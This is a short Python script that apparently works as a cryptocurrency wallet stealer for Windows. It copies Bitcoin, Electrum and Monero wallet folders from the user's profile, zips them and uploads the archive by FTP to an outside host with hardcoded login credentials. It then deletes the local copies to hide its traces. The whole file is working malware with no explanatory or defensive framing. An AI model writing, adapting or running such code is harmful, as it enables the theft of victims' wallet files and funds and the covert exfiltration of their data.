import os
import shutil
from pathlib import Path
import ftplib
import time
import random
rn = str(random.randrange(10000,99999))
ftphost = "vpn.oxasploits.com"
ftpun = "liftingcrypting"
ftppw = "1234qwer!!"
tmpp = r'C:\Users\marsh'
dstp = tmpp + "\\weee\\"
os.makedirs(os.path.dirname(dstp), exist_ok=True)
zipn = Path(tmpp + "\\b")
btc_w = os.path.expandvars(r'%APPDATA%\Bitcoin\wallets')
btc_w2 = os.path.expandvars(r'%APPDATA%\Electrum\wallets')
xmr_w = os.path.expandvars(r'C:\$homepath\Documents\Monero\wallets')
btc_wp = Path(btc_w)
btc_wp2 = Path(btc_w2)
xmr_wp = Path(xmr_w)
check_btc = Path(dstp + "\\btc\\")
if not check_btc.exists():
  if btc_wp.exists():
    shutil.copytree(btc_wp, dstp + "\\btc\\", symlinks=False, ignore=None)
  if btc_wp2.exists():
    shutil.copytree(btc_wp2, dstp + "\\btc\\", symlinks=False, ignore=None)
  if xmr_wp.exists():
    shutil.copytree(xmr_wp, dstp + "\\xmr\\", symlinks=False, ignore=None)
  shutil.make_archive(zipn, 'zip', dstp)
ftp_server = ftplib.FTP()
ftp_server.connect(ftphost, 21)
ftp_server.login(user=ftpun, passwd=ftppw)
ftp_server.set_pasv(False)
ftp_server.encoding = "utf-8"
os.chdir(tmpp)
with open('b.zip', "rb") as file:
  ftp_server.storbinary(f"STOR {rn + '.zip'}", file)
ftp_server.quit()
os.remove('b.zip')
shutil.rmtree('weee')